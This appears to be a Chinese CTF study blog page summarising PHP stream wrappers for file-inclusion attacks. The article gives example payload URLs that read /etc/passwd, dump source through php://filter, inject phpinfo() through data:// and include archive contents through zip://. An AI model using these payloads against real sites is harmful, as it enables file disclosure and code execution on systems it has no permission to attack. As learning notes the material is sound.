@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>php伪协议总结 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="参考：https:&#x2F;&#x2F;www.cnblogs.com&#x2F;wjrblogs&#x2F;p&#x2F;12285202.html，https:&#x2F;&#x2F;www.smi1e.top&#x2F;%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE&#x2F; 123456789101112file:&#x2F;&amp;#x2F">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php伪协议总结">
+<meta property="og:url" content="http://example.com/2021/01/22/CTF-Web-php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="参考：https:&#x2F;&#x2F;www.cnblogs.com&#x2F;wjrblogs&#x2F;p&#x2F;12285202.html，https:&#x2F;&#x2F;www.smi1e.top&#x2F;%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE&#x2F; 123456789101112file:&#x2F;&amp;#x2F">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-01-22T06:44:29.000Z">
+<meta property="article:modified_time" content="2021-01-22T07:16:05.378Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-CTF-Web-php伪协议总结" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/01/22/CTF-Web-php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/" class="article-date">
+  <time class="dt-published" datetime="2021-01-22T06:44:29.000Z" itemprop="datePublished">2021-01-22</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      php伪协议总结
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wjrblogs/p/12285202.html%EF%BC%8Chttps://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/">https://www.cnblogs.com/wjrblogs/p/12285202.html，https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F; — 访问本地文件系统</span><br><span class="line">http:&#x2F;&#x2F; — 访问 HTTP(s) 网址</span><br><span class="line">ftp:&#x2F;&#x2F; — 访问 FTP(s) URLs</span><br><span class="line">php:&#x2F;&#x2F; — 访问各个输入&#x2F;输出流（I&#x2F;O streams）</span><br><span class="line">zlib:&#x2F;&#x2F; — 压缩流</span><br><span class="line">data:&#x2F;&#x2F; — 数据（RFC 2397）</span><br><span class="line">glob:&#x2F;&#x2F; — 查找匹配的文件路径模式</span><br><span class="line">phar:&#x2F;&#x2F; — PHP 归档</span><br><span class="line">ssh2:&#x2F;&#x2F; — Secure Shell 2</span><br><span class="line">rar:&#x2F;&#x2F; — RAR</span><br><span class="line">ogg:&#x2F;&#x2F; — 音频流</span><br><span class="line">expect:&#x2F;&#x2F; — 处理交互式的流</span><br></pre></td></tr></table></figure>
+<p>在不同的伪协议中，需要allow_url_fopen和allow_url_include的开启状态是不同的</p>
+<h1 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 访问本地文件</span><br><span class="line"># 不受allow_url_fopen和allow_url_include影响</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;www.xx.com?file&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passswd</span><br></pre></td></tr></table></figure>
+<h1 id="php"><a href="#php" class="headerlink" title="php://"></a>php://</h1><h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h2><p>是一种元封装器，设计用于数据流打开时的筛选过滤应用<br>不受allow_url_open和allow_url_include影响</p>
+<h3 id="四个参数"><a href="#四个参数" class="headerlink" title="四个参数"></a>四个参数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">resource&#x3D;&lt;要过滤的数据流&gt;     这个参数是必须的。它指定了你要筛选过滤的数据流。</span><br><span class="line">read&#x3D;&lt;读链的筛选列表&gt;         该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">write&#x3D;&lt;写链的筛选列表&gt;    该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">&lt;；两个链的筛选列表&gt;        任何没有以 read&#x3D; 或 write&#x3D; 作前缀 的筛选器列表会视情况应用于读或写链。</span><br></pre></td></tr></table></figure>
+<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.xx.com?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;upload.php</span><br><span class="line"># 把输入流进行base64编码</span><br></pre></td></tr></table></figure>
+<p>转换过滤器：convert.base64-encode，convert.base64-decode</p>
+<h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h2><p>可以访问请求的原始数据的只读流，读取post中未解析的原始数据</p>
+<p>需要allow_url_include开启</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 读取post数据</span><br><span class="line">http:&#x2F;&#x2F;www.xx.com&#x2F;cmd.php?file&#x3D;php:&#x2F;&#x2F;input</span><br></pre></td></tr></table></figure>
+<h1 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h1><p>数据流封装器</p>
+<p>需要allow_urul_ioncludeallow_url_include打开</p>
+<h2 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;xxx.php?a&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;xxx.php?a&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo()?&gt;</span><br></pre></td></tr></table></figure>
+<h1 id="zip-，bzip2-，zlib"><a href="#zip-，bzip2-，zlib" class="headerlink" title="zip://，bzip2://，zlib://"></a>zip://，bzip2://，zlib://</h1><p>用于打开压缩文件</p>
+<p>不受allow_url_fopen和allow_url_include的影响</p>
+<h2 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;xxx.php?a&#x3D;zip:&#x2F;&#x2F;C:\Users\liuxianglai\Desktop\test.jpg%23zip.txt</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;xxx.php?a&#x3D;compress.bzip2:&#x2F;&#x2F;C:&#x2F;Users&#x2F;liuxianglai&#x2F;Desktop&#x2F;test.bz2</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/01/22/CTF-Web-php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/" data-id="ckkdrz0yz0002ugus16vv6brh" data-title="php伪协议总结" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2021/01/24/CTF-wp-wechall%E7%AD%94%E6%A1%88/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          wechall答案
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2021/01/20/CTF-Web-SQL%E6%B3%A8%E5%85%A5/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">CTF-Web-SQL注入</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%91%98%E6%8A%84/" rel="tag">摘抄</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AD%94%E6%A1%88/" rel="tag">答案</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/%E6%91%98%E6%8A%84/" style="font-size: 10px;">摘抄</a> <a href="/tags/%E7%AD%94%E6%A1%88/" style="font-size: 10px;">答案</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/01/25/CTF-Web-SQL%E6%B3%A8%E5%85%A5WAF%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/">SQL注入WAF绕过姿势</a>
+          </li>
+        
+          <li>
+            <a href="/2021/01/24/CTF-wp-wechall%E7%AD%94%E6%A1%88/">wechall答案</a>
+          </li>
+        
+          <li>
+            <a href="/2021/01/22/CTF-Web-php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/">php伪协议总结</a>
+          </li>
+        
+          <li>
+            <a href="/2021/01/20/CTF-Web-SQL%E6%B3%A8%E5%85%A5/">CTF-Web-SQL注入</a>
+          </li>
+        
+          <li>
+            <a href="/2021/01/19/%E6%91%98%E6%8A%84-%E3%80%8A%E9%80%9A%E5%BE%80%E5%A5%B4%E5%BD%B9%E4%B9%8B%E8%B7%AF%E3%80%8B/">摘抄-《通往奴役之路》</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2021 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
